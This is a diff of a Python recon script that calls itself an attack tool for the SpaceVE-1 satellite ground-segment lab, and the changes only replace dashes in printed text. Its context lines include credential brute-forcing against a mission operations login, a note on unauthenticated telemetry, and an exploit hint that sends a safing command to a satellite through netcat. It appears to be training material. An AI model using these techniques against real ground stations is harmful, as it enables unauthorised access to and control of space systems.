@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ground_station_scanner.py — SpaceVE-1 Ground Segment Recon Tool
+ground_station_scanner.py - SpaceVE-1 Ground Segment Recon Tool
 SpaceVE-1 Lab Attack Tool
 
 Performs passive and active reconnaissance against the SpaceVE-1
@@ -104,7 +104,7 @@ def scan_moc():
         print(f"  GET /status: error ({e})")
 
     # WebSocket TLM stream (no auth)
-    print(f"\n  WebSocket TLM (ws://{MOC_HOST}:8765) — no auth required (MC-MOC-1)")
+    print(f"\n  WebSocket TLM (ws://{MOC_HOST}:8765) - no auth required (MC-MOC-1)")
     print(f"    Connect with: wscat -c ws://{MOC_HOST}:8765")
     print(f"    Or: python3 -c \"import websockets,asyncio; ...")
 
@@ -121,12 +121,12 @@ def scan_moc():
             if r.status_code == 200:
                 data = r.json()
                 token = data.get("token", "")
-                print(f"    {user}:{pwd} — VALID  token={token[:20]}...")
+                print(f"    {user}:{pwd} - VALID  token={token[:20]}...")
                 print(f"    *** VALID CREDENTIALS FOUND: {user}:{pwd} ***")
             else:
-                print(f"    {user}:{pwd} — {r.status_code} invalid")
+                print(f"    {user}:{pwd} - {r.status_code} invalid")
         except Exception as e:
-            print(f"    {user}:{pwd} — error ({e})")
+            print(f"    {user}:{pwd} - error ({e})")
 
     print()
 
@@ -144,15 +144,15 @@ def scan_gs():
         for line in banner_text.splitlines():
             print(f"    {line}")
         if "MAINTENANCE" in banner_text:
-            print("\n  *** GS-BETA IS IN MAINTENANCE MODE — NO AUTH REQUIRED (MC-GS-3) ***")
+            print("\n  *** GS-BETA IS IN MAINTENANCE MODE - NO AUTH REQUIRED (MC-GS-3) ***")
             print("  Exploit: nc localhost 4820")
             print("           SENDCMD SpaceVE-1A SAFING_MODE")
 
 
 def scan_satellite():
     banner("Satellite Port Recon (passive)")
-    print(f"  {SATELLITE_IP}:1234/udp — CCSDS command port (no auth)")
-    print(f"  Cannot be confirmed via simple TCP probe (UDP — use ccsds_packet_forge.py inside Docker)")
+    print(f"  {SATELLITE_IP}:1234/udp - CCSDS command port (no auth)")
+    print(f"  Cannot be confirmed via simple TCP probe (UDP - use ccsds_packet_forge.py inside Docker)")
     print(f"  From host: use GS-BETA relay (localhost:4820) instead of direct UDP")
 
 
